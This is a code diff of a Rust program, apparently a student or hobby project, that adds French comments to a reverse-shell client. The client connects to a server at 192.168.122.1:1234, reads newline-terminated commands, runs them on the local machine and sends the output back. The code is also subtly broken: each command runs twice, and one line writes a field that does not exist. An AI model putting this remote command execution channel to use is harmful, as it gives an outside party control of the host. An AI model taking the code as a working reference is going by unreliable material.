@@ -23,11 +23,12 @@ pub fn execute_command(command: String) -> Vec<u8> {
         command_exec.arg(i);
     }
     
+    //Puis on execute la commande 
     command_exec.spawn().expect("process failed to execute");
+    //On récupère la réponse
     let command_res = command_exec.output().unwrap().stdout;
     let stdout = String::from_utf8(command_res.clone()).unwrap();
     println!("{}", stdout);
-    println!("Commande finit");
 
     return command_res;
 }
@@ -39,27 +40,44 @@ pub fn execute_command(command: String) -> Vec<u8> {
 pub fn receive_message(mut stream: TcpStream) {
 let mut msg: Vec<u8> = Vec::new();
     loop {
+        //On créé le buffer
         let buf = &mut [0; 10];
 
+        //On lit le buffer
         match stream.read(buf) {
+            //Si on a une réponse
             Ok(response) => {
+                //Si elle est vide
                 if response < 1 {
+                    //On est déconecté, on quitte donc le logiciel
                     println!("Serveur déconnecté");
                     return;
                 }
-                let mut x = 0;
+                //On défini le compteur qui estimeras la longueur du buffer
+                let mut len = 0;
 
+                //Pour chaque bit du buffer
                 for c in buf {
-                    if x >= response {
+                    //si la longueur est plus grande ou egale a la reponse
+                    if len >= response {
+                        //On quitte
                         break;
                     }
-                    x += 1;
+                    //On rajoute un au coumpteur
+                    len += 1;
+                    //si le bit est un sybole de fin de ligne
                     if *c == '\n' as u8 {
+                        //On stoque le total dans un string
                         let command = String::from_utf8(msg.clone()).unwrap();
+                        //On génére et execute la commande
                         let command_res = execute_command(command);
+                        //On affiche son résultat
                         stream.write(&command_res.stdout);
+                        //et on vide le collecteur
                         msg.clear();
+                    //sinon
                     } else {
+                        //On rajoute le bit au collecteur
                         msg.push(*c);
                     }
                 }
@@ -75,8 +93,11 @@ let mut msg: Vec<u8> = Vec::new();
 ///Cette fonction établie la connection avec le serveur.
 pub fn establish_connection() {
     println!("Tentative de connexion au serveur...");
+    //on se connecte au serveur
     match TcpStream::connect("192.168.122.1:1234") {
+        //si la connection est etablie
         Ok(stream) => {
+            //On avertit l'utilisateur
             println!("Connexion au serveur réussi !");
             receive_message(stream);
         }
